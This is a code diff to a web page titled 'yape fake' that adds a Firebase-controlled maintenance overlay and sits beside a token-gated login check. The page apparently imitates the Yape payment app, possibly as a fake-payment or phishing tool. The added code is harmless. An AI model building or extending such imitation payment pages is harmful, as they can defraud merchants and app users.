@@ -99,7 +99,25 @@ button {
 </head>
 
 <body>
-
+<!-- ===== PANTALLA DE MANTENIMIENTO ===== -->
+<div id="maintenanceScreen" style="
+  display:none;
+  position:fixed;
+  inset:0;
+  background:#020617;
+  color:#fff;
+  z-index:9999;
+  display:flex;
+  flex-direction:column;
+  justify-content:center;
+  align-items:center;
+  text-align:center;
+  padding:20px;
+">
+  <h1>🚧 Sistema en mantenimiento</h1>
+  <p>Estamos realizando mejoras.<br>Inténtalo más tarde.</p>
+</div>
+  
 <div class="card">
     <h1>yape fake</h1>
     <div class="subtitle">acceso seguro</div>
@@ -137,7 +155,19 @@ const firebaseConfig = {
 
 const app = initializeApp(firebaseConfig);
 const db = getDatabase(app);
+const maintenanceRef = ref(db, "config/maintenance/enabled");
+  const screen = document.getElementById("maintenanceScreen");
 
+  // Escucha en tiempo real
+  onValue(maintenanceRef, (snap) => {
+    if (snap.exists() && snap.val() === true) {
+      screen.style.display = "flex";
+      document.body.style.overflow = "hidden";
+    } else {
+      screen.style.display = "none";
+      document.body.style.overflow = "";
+    }
+  });
 // 🔑 Verificar token
 window.checkToken = function () {
     const token = document.getElementById("token").value.trim();
